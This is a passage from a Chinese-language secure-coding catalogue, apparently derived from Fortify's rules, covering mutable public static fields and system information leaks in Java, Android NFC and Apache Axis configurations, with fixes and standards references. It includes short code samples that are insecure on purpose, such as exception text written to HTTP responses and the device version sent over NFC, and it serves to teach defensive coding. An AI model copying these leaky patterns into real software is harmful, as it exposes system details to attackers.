<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<h4 id="Poor-Style-Non-final-Public-Static-Field"><a href="#Poor-Style-Non-final-Public-Static-Field" class="headerlink" title="Poor Style: Non-final Public Static Field"></a>Poor Style: Non-final Public Static Field</h4><h5 id="ABSTRACT-123"><a href="#ABSTRACT-123" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>外部类可更改非最终公共静态字段。</p>
<h5 id="EXPLANATION-124"><a href="#EXPLANATION-124" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通常情况下，您不会希望为外部类提供对象成员字段的直接访问路径，因为任意外部类都可以更改公共字段。面向对象的良好设计使用 Encapsulation 来防止将实现详细信息（例如成员字段）暴露给其他类。此外，如果系统假定此字段不可更改，则恶意代码可能能够逆向更改系统的行为。</p>
<p>示例 1：在以下代码中，字段 ERROR_CODE 已声明为公共、静态和非最终：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public static int ERROR_CODE = 100;</span><br><span class="line"></span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这种情况下，恶意代码可能能够更改此错误代码并导致程序出现意外行为。</p>
<h5 id="RECOMMENDATIONS-123"><a href="#RECOMMENDATIONS-123" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果您希望将字段作为常数值公开，则应将该字段声明为 public static final，否则就将该字段声明为 private。</p>
<p>例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public static final int ERROR_CODE = 123;</span><br><span class="line"></span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-122"><a href="#REFERENCES-122" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Secure Coding Guidelines for the Java Programming Language, version 2.0</p>
<p>[2] OBJ10-J. Do not use public static nonfinal fields CERT</p>
<p>[3] MUTABLE-9: Make public static fields final Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 493</p>
<h4 id="System-Information-Leak"><a href="#System-Information-Leak" class="headerlink" title="System Information Leak"></a>System Information Leak</h4><h5 id="ABSTRACT-124"><a href="#ABSTRACT-124" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-125"><a href="#EXPLANATION-125" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>示例 1：以下代码会将异常打印到标准错误流：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依据这一系统配置，该信息可转储到控制台，写成日志文件，或者显示给远程用户。例如，凭借脚本机制，可以轻松将输出信息从“标准错误”或“标准输出”重定向至文件或其他程序。或者，运行程序的系统可能具有将日志发送至远程设备的远程日志记录系统，例如 “syslog” 服务器。在开发过程中，您将无法知道此信息最终可能显示的位置。</p>
<p>在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在上述例子中，泄露的信息可能会暗示操作系统的类型、系统上安装了哪些应用程序，以及管理员在配置应用程序时做了哪些方面的努力。</p>
<p>这是另一种情况，特定于移动世界。大多数移动设备现在执行的是“近场通信”(NFC) 协议，以便使用无线电通信在设备之间快速共享信息。它在设备极为贴近或互相接触时有效。即使 NFC 的通信范围仅局限于几厘米，也可能发生窃听、修改数据以及各种其他类型的攻击情况，因为 NFC 本身并不能确保通信安全。</p>
<p>示例 2：Android 平台提供对 NFC 的支持。以下代码将创建一条消息，该消息会被发送给所在范围内的其他设备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public static final String TAG = &quot;NfcActivity&quot;;</span><br><span class="line"></span><br><span class="line">private static final String DATA_SPLITTER = &quot;__:DATA:__&quot;;</span><br><span class="line"></span><br><span class="line">private static final String MIME_TYPE = &quot;application/my.applications.mimetype&quot;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public NdefMessage createNdefMessage(NfcEvent event) &#123;</span><br><span class="line"></span><br><span class="line">    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">    String VERSION = tm.getDeviceSoftwareVersion();</span><br><span class="line"></span><br><span class="line">    String text = TAG + DATA_SPLITTER + VERSION;</span><br><span class="line"></span><br><span class="line">    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,</span><br><span class="line"></span><br><span class="line">            MIME_TYPE.getBytes(), new byte[0], text.getBytes());</span><br><span class="line"></span><br><span class="line">    NdefRecord[] records = &#123; record &#125;;</span><br><span class="line"></span><br><span class="line">    NdefMessage msg = new NdefMessage(records);</span><br><span class="line"></span><br><span class="line">    return msg;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>NFC 数据交换格式 (NDEF) 消息包含类型化数据、URI 或自定义应用程序负载。如果该消息包含与应用程序有关的信息（如其名称、MIME 类型或设备软件版本），则该信息将被泄露给窃听者。在上述示例中，Fortify Static Code Analyzer（Fortify 静态代码分析器）会在返回语句中报告 System Information Leak 漏洞。</p>
<h5 id="RECOMMENDATIONS-124"><a href="#RECOMMENDATIONS-124" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<p>如果您担心 Android 设备上的系统数据会通过 NFC 泄露，那么您可以采取以下三种措施之一。不把系统数据包括在发送到范围内其他设备的消息中，或加密消息负载，或在更高层中建立安全通信通道。</p>
<h5 id="REFERENCES-123"><a href="#REFERENCES-123" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] ENV02-J. Do not trust the values of environment variables CERT</p>
<p>[4] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[5] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Apache-Axis"><a href="#System-Information-Leak-Apache-Axis" class="headerlink" title="System Information Leak: Apache Axis"></a>System Information Leak: Apache Axis</h4><h5 id="ABSTRACT-125"><a href="#ABSTRACT-125" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-126"><a href="#EXPLANATION-126" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>当将参数 axis.enableListQuery 设为 true 时，它会启用 Web 服务部署描述符 (WSDD) 列表。此功能会泄漏包含敏感信息（如 adminservice 密码）的当前系统配置。</p>
<h5 id="RECOMMENDATIONS-125"><a href="#RECOMMENDATIONS-125" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将 axis.enableListQuery 设为 false，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;globalConfiguration&gt;</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;axis.enableListQuery&quot; value=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-124"><a href="#REFERENCES-124" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Service Security Apache Software Foundation</p>
<p>[2] Axis Reference Guide Apache Software Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[27] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Apache-Axis-2"><a href="#System-Information-Leak-Apache-Axis-2" class="headerlink" title="System Information Leak: Apache Axis 2"></a>System Information Leak: Apache Axis 2</h4><h5 id="ABSTRACT-126"><a href="#ABSTRACT-126" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-127"><a href="#EXPLANATION-127" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>此参数可让 Apache Axis 2 将错误消息发送给客户端。错误消息包含堆栈跟踪信息；在某些情况下，该错误消息可准确地告知攻击者该系统易受哪种攻击。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。</p>
<h5 id="RECOMMENDATIONS-126"><a href="#RECOMMENDATIONS-126" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<p>在这种情况下，将 sendStacktraceDetailsWithFaults 参数设为 false，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;parameter name=&quot;sendStacktraceDetailsWithFaults&quot;&gt;false&lt;/parameter&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-125"><a href="#REFERENCES-125" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] How to stop Axis2 sending stack traces in case of a fault? WSO2</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-External"><a href="#System-Information-Leak-External" class="headerlink" title="System Information Leak: External"></a>System Information Leak: External</h4><h5 id="ABSTRACT-127"><a href="#ABSTRACT-127" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-128"><a href="#EXPLANATION-128" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过套接字或网络连接使程序流向远程机器时，就会发生外部信息泄露。外部信息泄露会暴露有关操作系统、完整路径名、现有用户名或配置文件位置的特定数据，从而使攻击者有机可乘，它比内部信息（攻击者更难访问）泄露更严重。</p>
<p>示例 1：以下代码泄露了 HTTP 响应中的异常信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    PrintWriter out = res.getWriter();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">      out.println(e.getMessage());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该信息可以显示给远程用户。在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在上述例子中，泄露的信息可能会暗示操作系统的类型、系统上安装了哪些应用程序，以及管理员在配置应用程序时做了哪些方面的努力。</p>
<p>这是另一种情况，特定于移动世界。大多数移动设备现在执行的是“近场通信”(NFC) 协议，以便使用无线电通信在设备之间快速共享信息。它在设备极为贴近或互相接触时有效。即使 NFC 的通信范围仅局限于几厘米，也可能发生窃听、修改数据以及各种其他类型的攻击情况，因为 NFC 本身并不能确保通信安全。</p>
<p>示例 2：Android 平台提供对 NFC 的支持。以下代码将创建一条消息，该消息会被发送给所在范围内的其他设备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public static final String TAG = &quot;NfcActivity&quot;;</span><br><span class="line"></span><br><span class="line">private static final String DATA_SPLITTER = &quot;__:DATA:__&quot;;</span><br><span class="line"></span><br><span class="line">private static final String MIME_TYPE = &quot;application/my.applications.mimetype&quot;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public NdefMessage createNdefMessage(NfcEvent event) &#123;</span><br><span class="line"></span><br><span class="line">    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line"></span><br><span class="line">    String VERSION = tm.getDeviceSoftwareVersion();</span><br><span class="line"></span><br><span class="line">    String text = TAG + DATA_SPLITTER + VERSION;</span><br><span class="line"></span><br><span class="line">    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,</span><br><span class="line"></span><br><span class="line">            MIME_TYPE.getBytes(), new byte[0], text.getBytes());</span><br><span class="line"></span><br><span class="line">    NdefRecord[] records = &#123; record &#125;;</span><br><span class="line"></span><br><span class="line">    NdefMessage msg = new NdefMessage(records);</span><br><span class="line"></span><br><span class="line">    return msg;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>NFC 数据交换格式 (NDEF) 消息包含类型化数据、URI 或自定义应用程序负载。如果该消息包含与应用程序有关的信息（如其名称、MIME 类型或设备软件版本），则该信息将被泄露给窃听者。在上述示例中，Fortify Static Code Analyzer（Fortify 静态代码分析器）会在返回语句中报告 System Information Leak 漏洞。</p>
<h5 id="RECOMMENDATIONS-127"><a href="#RECOMMENDATIONS-127" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<p>如果您担心 Android 设备上的系统数据会通过 NFC 泄露，那么您可以采取以下三种措施之一。不把系统数据包括在发送到范围内其他设备的消息中，或加密消息负载，或在更高层中建立安全通信通道。</p>
<h5 id="REFERENCES-126"><a href="#REFERENCES-126" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] ENV02-J. Do not trust the values of environment variables CERT</p>
<p>[4] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[5] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-HTML-Comment-in-JSP"><a href="#System-Information-Leak-HTML-Comment-in-JSP" class="headerlink" title="System Information Leak: HTML Comment in JSP"></a>System Information Leak: HTML Comment in JSP</h4><h5 id="ABSTRACT-128"><a href="#ABSTRACT-128" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</p>
<h5 id="EXPLANATION-129"><a href="#EXPLANATION-129" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML 注释会给攻击者提供关于动态生成的 web 页面的信息源。</p>
<p>例 1：</p>
